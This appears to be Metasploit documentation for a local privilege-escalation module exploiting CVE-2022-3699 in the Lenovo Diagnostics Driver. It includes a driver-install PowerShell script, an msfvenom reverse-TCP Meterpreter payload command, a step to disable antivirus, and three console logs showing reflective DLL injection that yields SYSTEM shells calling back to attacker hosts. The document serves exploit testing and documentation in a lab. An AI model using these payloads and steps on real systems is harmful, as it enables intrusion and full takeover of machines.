## Vulnerable Application

### Description
Incorrect access control for the Lenovo Diagnostics Driver allows a low-privileged user the ability to issue device 
IOCTLs to perform arbitrary physical/virtual memory read/write.

### Setup

A copy of the vulnerable Lenovo Diagnostics Driver can be downloaded from the github repo that hosts the original PoC
that this module uses: https://github[.]com/alfarom256/CVE-2022-3699/raw/main/LenovoDiagnosticsDriver.sys

Use this script to install the driver by registering a service to load it: 

install-driver.ps1:
```
param (
    [String] $driver,
    [Switch] $start,
    [String] $startType="auto"
)

$version = "1.0"
$helpText = "
install-driver.ps1 v$version

Install a driver by registering a service to load it.

Arguments:
  [String] driver       The driver file to install
  [Switch] start        Start the service to load the driver
  [String] startType    The service start type
                        Choose:  auto, demand
                        Default: auto

Example:
  .\install-driver.ps1 -driver MyDriver -start
"

if (-Not $PSBoundParameters.ContainsKey('driver')) {
    Write-Host "[-] " -ForegroundColor Red -NoNewLine
    Write-Host "A driver must be specified with -driver"
    Write-Host $helpText
    exit
}

if (@("auto", "demand") -NotContains $startType) {
    Write-Host "[-] " -ForegroundColor Red -NoNewLine
    Write-Host "Invalid startType: $startType, (must be: auto, demand)"
    Write-Host $helpText
    exit
}

$name=$driver.TrimEnd('.sys')

if (-Not (Test-Path -Path $env:SystemRoot\System32\Drivers\$name.sys -PathType Leaf)) {
    if (-Not (Test-Path -Path "$name.sys" -PathType Leaf)) {
        Write-Host "[-] " -ForegroundColor Red -NoNewLine
        Write-Host "The specified driver was not found"
        exit
    }
    Write-Host "[*] " -ForegroundColor Blue -NoNewLine
    Write-Host "Installing the driver to System32"
    Copy-Item "$name.sys" -Destination $env:SystemRoot\System32\Drivers\$name.sys
}

sc.exe create $name type= kernel start= $startType error= normal binPath= System32\Drivers\$name.sys DisplayName= $name | Out-Null

if ($start) {
    Write-Host "[*] " -ForegroundColor Blue -NoNewLine
    Write-Host "Starting the new service"
    sc.exe start $name | Out-Null
}
```

## Verification Steps

1. Create a shell for an initial foothold:
   `./msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.123.1 LPORT=4444 -f exe > shell.exe`
1. Disable Real-time Virus Protection on the Windows 11 test target.
1. Drag shell.exe onto the Windows 11 test target
1. Start msfconsole
1. Do: `use multi/handler`
1. set LHOST and LPORT
1. Launch `shell.exe` on the test target and receive a shell
1. Do `use windows/local/cve_2022_3699_lenovo_diagnostics_driver`
1. Set the `LHOST`, `LPORT`, and `SESSION` options
1. Run the module
1. Receive a Meterpreter session as the `NT AUTHORITY\SYSTEM` user.

## Scenarios
### Windows 11 21H2, with vulnerable version of LenovoDiagnosticsDriver.sys in use. 
```
msf6 > use multi/handler
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.123.1
LHOST => 192.168.123.1
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.123.1:4444
[*] Sending stage (200774 bytes) to 192.168.123.212
[*] Meterpreter session 17 opened (192.168.123.1:4444 -> 192.168.123.212:49692) at 2022-12-12 12:34:15 -0500

meterpreter > bg
[*] Backgrounding session 17...
msf6 exploit(multi/handler) > use windows/local/cve_2022_3699_lenovo_diagnostics_driver
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2022_3699_lenovo_diagnostics_driver) > set session 17
session => 17
msf6 exploit(windows/local/cve_2022_3699_lenovo_diagnostics_driver) > set LHOST 192.168.123.1
LHOST => 192.168.123.1
msf6 exploit(windows/local/cve_2022_3699_lenovo_diagnostics_driver) > set LPORT 4445
LPORT => 4445
msf6 exploit(windows/local/cve_2022_3699_lenovo_diagnostics_driver) > run

[*] Started reverse TCP handler on 192.168.123.1:4445
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Launching msiexec to host the DLL...
[+] Process 4292 launched.
[*] Reflectively injecting the DLL into 4292...
[*] Sending stage (200774 bytes) to 192.168.123.212
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 18 opened (192.168.123.1:4445 -> 192.168.123.212:49696) at 2022-12-12 12:41:32 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : MSFTESTING
OS              : Windows 10 (10.0 Build 22000).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter >
```

### Windows 10 22H2, with vulnerable version of LenovoDiagnosticsDriver.sys in use.
```
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 172.16.199.1
lhost => 172.16.199.1
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 172.16.199.1:4444
[*] Sending stage (200774 bytes) to 172.16.199.133
[*] Meterpreter session 8 opened (172.16.199.1:4444 -> 172.16.199.133:50093) at 2023-01-18 01:20:16 -0500

meterpreter > bg
[*] Backgrounding session 8...
msf6 exploit(multi/handler) > use windows/local/cve_2022_3699_lenovo_diagnostics_driver
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2022_3699_lenovo_diagnostics_driver) > set session 8
rsession => 8
msf6 exploit(windows/local/cve_2022_3699_lenovo_diagnostics_driver) > set LHOST 172.16.199.1
LHOST => 172.16.199.1
msf6 exploit(windows/local/cve_2022_3699_lenovo_diagnostics_driver) > set LPORT 4445
LPORT => 4445
msf6 exploit(windows/local/cve_2022_3699_lenovo_diagnostics_driver) > run

[*] Started reverse TCP handler on 172.16.199.1:4445
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Launching netsh to host the DLL...
[+] Process 432 launched.
[*] Reflectively injecting the DLL into 432...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (200774 bytes) to 172.16.199.133
[*] Meterpreter session 9 opened (172.16.199.1:4445 -> 172.16.199.133:50095) at 2023-01-18 01:20:33 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : DESKTOP-8ATHH6O
OS              : Windows 10 (10.0 Build 19045).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter >
```

### Windows 10 21H2, with vulnerable version of LenovoDiagnosticsDriver.sys in use.
```
msf6 exploit(windows/local/cve_2022_3699_lenovo_diagnostics_driver) > use multi/handler
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 172.16.199.1
LHOST => 172.16.199.1
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 172.16.199.1:4444
[*] Sending stage (200774 bytes) to 172.16.199.141
[*] Meterpreter session 10 opened (172.16.199.1:4444 -> 172.16.199.141:49768) at 2023-01-18 01:31:09 -0500

meterpreter > bg
[*] Backgrounding session 10...
msf6 exploit(multi/handler) > use windows/local/cve_2022_3699_lenovo_diagnostics_driver
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2022_3699_lenovo_diagnostics_driver) > set session 10
session => 10
msf6 exploit(windows/local/cve_2022_3699_lenovo_diagnostics_driver) > set LHOST 172.16.199.1
LHOST => 172.16.199.1
msf6 exploit(windows/local/cve_2022_3699_lenovo_diagnostics_driver) > set LPORT 4445
LPORT => 4445
msf6 exploit(windows/local/cve_2022_3699_lenovo_diagnostics_driver) > run

[*] Started reverse TCP handler on 172.16.199.1:4445
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Launching netsh to host the DLL...
[+] Process 2160 launched.
[*] Reflectively injecting the DLL into 2160...
[*] Sending stage (200774 bytes) to 172.16.199.141
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 11 opened (172.16.199.1:4445 -> 172.16.199.141:49803) at 2023-01-18 01:31:26 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : DESKTOP-SF7KLAH
OS              : Windows 10 (10.0 Build 19044).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter >
```
